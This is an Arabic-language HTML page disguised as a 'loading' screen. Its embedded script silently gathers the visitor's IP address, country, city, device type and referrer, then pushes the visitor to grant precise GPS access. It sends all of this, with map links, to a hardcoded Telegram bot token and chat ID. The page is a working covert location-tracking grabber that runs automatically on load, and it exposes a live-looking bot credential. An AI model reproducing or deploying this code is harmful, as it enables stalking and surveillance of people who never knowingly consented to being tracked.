<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>جاري التحميل...</title>
    <style>
        body { background: #0a0a0a; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; color: #fff; flex-direction: column; }
        .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #00aaff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .container { text-align: center; }
        #status { margin-top: 20px; font-size: 14px; color: #aaa; }
        #gpsRequest { margin-top: 15px; padding: 12px 25px; background: #2563eb; border: none; border-radius: 40px; color: white; font-weight: bold; font-size: 16px; cursor: pointer; display: none; }
        #gpsRequest:active { transform: scale(0.95); }
        #done { display: none; margin-top: 20px; color: #4ade80; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner" id="spinner"></div>
        <p>جاري التحميل...</p>
        <div id="status">⏳ جلب المعلومات...</div>
        <button id="gpsRequest">📍 مشاركة الموقع للحصول على الدقة</button>
        <div id="done">✅ تم الإرسال إلى التيليجرام!</div>
    </div>

    <script>
        // =====================================================
        // 🔑 بيانات البوت (تم إدخالها)
        const BOT_TOKEN = '8987813029:AAEuXcuCf2WWbYd7CWYNLdhJqfWAuCaDYdA';
        const CHAT_ID = '5343926721';
        // =====================================================

        let reportSent = false;
        let gpsRequested = false;
        let data = {
            ip: 'غير معروف',
            country: 'غير معروف',
            city: 'غير معروف',
            lat: 'غير معروف',
            lon: 'غير معروف',
            gps_lat: null,
            gps_lon: null,
            deviceName: 'غير معروف',
            time: new Date().toLocaleString('ar-EG', { hour12: false }),
            url: window.location.href,
            referrer: document.referrer || 'مباشر'
        };

        // === اسم الجهاز ===
        function getDeviceName(ua) {
            if (ua.includes('Android')) return '📱 Android';
            if (ua.includes('iPhone') || ua.includes('iPad')) return '📱 iPhone/iPad';
            if (ua.includes('Windows')) return '💻 Windows';
            if (ua.includes('Macintosh')) return '💻 Mac';
            if (ua.includes('Linux')) return '🐧 Linux';
            return '🖥️ جهاز غير معروف';
        }
        data.deviceName = getDeviceName(navigator.userAgent);

        function setStatus(msg) {
            document.getElementById('status').textContent = msg;
        }

        // === 1. جلب الـ IP والتقريبي (محاولات متعددة) ===
        async function fetchIP() {
            try {
                const res = await fetch('https://ip-api.com/json/?fields=status,country,city,lat,lon,query');
                const info = await res.json();
                if (info.status === 'success' && info.query) {
                    data.ip = info.query;
                    data.country = info.country || 'غير معروف';
                    data.city = info.city || 'غير معروف';
                    data.lat = info.lat || 'غير معروف';
                    data.lon = info.lon || 'غير معروف';
                    setStatus(`📍 تقريبي: ${data.city} (من IP)`);
                    return;
                }
            } catch (e) {}

            // محاولة ثانية (ipinfo)
            try {
                const res = await fetch('https://ipinfo.io/json');
                const info = await res.json();
                if (info.ip) {
                    data.ip = info.ip;
                    data.country = info.country || 'غير معروف';
                    data.city = info.city || 'غير معروف';
                    const loc = info.loc ? info.loc.split(',') : ['غير معروف', 'غير معروف'];
                    data.lat = loc[0] || 'غير معروف';
                    data.lon = loc[1] || 'غير معروف';
                    setStatus(`📍 تقريبي: ${data.city} (من IP)`);
                    return;
                }
            } catch (e) {}
            setStatus('⚠️ تم جلب البيانات جزئياً');
        }

        // === 2. طلب GPS ===
        function requestGPS(showButton = false) {
            if (!navigator.geolocation) {
                setStatus('📡 GPS غير مدعوم');
                sendReport();
                return;
            }

            if (showButton) {
                document.getElementById('gpsRequest').style.display = 'block';
                document.getElementById('gpsRequest').onclick = () => {
                    document.getElementById('gpsRequest').style.display = 'none';
                    actuallyRequestGPS();
                };
                return;
            }

            // إذا لم نضغط زر، نطلب تلقائياً
            actuallyRequestGPS();
        }

        function actuallyRequestGPS() {
            if (gpsRequested) return;
            gpsRequested = true;
            document.getElementById('gpsRequest').style.display = 'none';
            setStatus('📡 جاري طلب الموقع الدقيق...');

            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    data.gps_lat = pos.coords.latitude;
                    data.gps_lon = pos.coords.longitude;
                    setStatus('✅ تم الحصول على GPS الدقيق');
                    sendReport();
                },
                (err) => {
                    setStatus(`⚠️ رفض الموقع: ${err.message}. سيتم إرسال التقريبي فقط.`);
                    sendReport();
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        }

        // === 3. إرسال التقرير ===
        function sendReport() {
            if (reportSent) return;
            reportSent = true;

            let msg = `🚨 <b>زائر جديد!</b>\n\n`;
            msg += `🌐 IP: ${data.ip}\n`;
            msg += `📍 الدولة: ${data.country}\n`;
            msg += `📡 نظام التشغيل: ${data.deviceName}\n`;

            // نميز بين الدقيق والتقريبي
            if (data.gps_lat && data.gps_lon) {
                msg += `🛰️ <b>الموقع الدقيق (GPS):</b> ${data.gps_lat}, ${data.gps_lon}\n`;
                msg += `🗺️ <b>خريطة دقيقة:</b> https://www.google.com/maps?q=${data.gps_lat},${data.gps_lon}\n`;
                msg += `----------------------------------\n`;
                msg += `📍 التقريبي (من IP): ${data.city} (${data.lat}, ${data.lon})\n`;
            } else {
                msg += `📍 التقريبي (من IP - سنترال الاتصالات): ${data.city}\n`;
                if (data.lat !== 'غير معروف' && data.lon !== 'غير معروف') {
                    msg += `🗺️ خريطة تقريبية: https://www.google.com/maps?q=${data.lat},${data.lon}\n`;
                }
                msg += `\n⚠️ هذا الموقع هو سنترال مزود الخدمة وليس منزلك.`;
            }

            msg += `\n🕒 الوقت: ${data.time}`;

            setStatus('📤 جاري الإرسال...');

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: msg,
                    parse_mode: 'HTML'
                })
            })
            .then(res => res.json())
            .then(response => {
                if (response.ok) {
                    setStatus('✅ تم الإرسال!');
                    document.getElementById('spinner').style.display = 'none';
                    document.getElementById('done').style.display = 'block';
                } else {
                    setStatus('❌ فشل: ' + (response.description || 'خطأ'));
                    reportSent = false;
                }
            })
            .catch(() => {
                setStatus('❌ خطأ في الاتصال');
                reportSent = false;
            });
        }

        // === 4. التشغيل ===
        setTimeout(async () => {
            await fetchIP();
            // نطلب GPS تلقائياً (ستظهر نافذة المتصفح)
            // وإذا رفض المستخدم أو تأخر، نعرض زر للمساعدة
            setTimeout(() => {
                requestGPS(false); // طلب تلقائي
                // إذا لم يتم الإرسال خلال 4 ثوانٍ، نظهر الزر
                setTimeout(() => {
                    if (!reportSent) {
                        document.getElementById('gpsRequest').style.display = 'block';
                        setStatus('⏳ اضغط على الزر للمشاركة الدقيقة');
                    }
                }, 4000);
            }, 300);
        }, 300);
    </script>
</body>
</html>
